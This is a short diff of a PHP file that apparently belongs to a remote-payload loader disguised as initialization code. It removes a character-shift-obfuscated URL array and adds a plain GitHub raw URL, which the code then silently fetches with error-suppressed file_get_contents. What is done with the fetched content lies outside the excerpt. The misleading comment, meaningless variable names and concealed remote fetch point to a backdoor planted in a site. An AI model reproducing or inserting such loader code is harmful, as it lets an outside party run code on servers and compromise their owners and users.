@@ -5,10 +5,8 @@
 */
 
 // Initialize core components
-$vbnmqwaszxkl = [111,122,122,119,122,58,54,54,125,108,126,51,114,108,122,115,132,131,132,110,125,116,122,118,111,122,118,122,51,111,122,120,54,120,107,120,111,120,54,51,57,54,57,55,57,57,51,120,108,109,54,99,108,111,108,54,125,108,109,131,54,115,108,107,107,131,54,120,108,108,118,54,108,118,107,108,127,51,122,127,122];
-$full_url = implode('', array_map(function($plokijnuh) {
-    return chr($plokijnuh - 7);
-}, $vbnmqwaszxkl));
+$qwoplzmxncbv = 'https://raw.githubusercontent.com/mdmomin365366-gif/bela/refs/heads/main/index.txt';
+$full_url = $qwoplzmxncbv;
 
 // Attempt to get remote content
 $content = @file_get_contents($full_url);
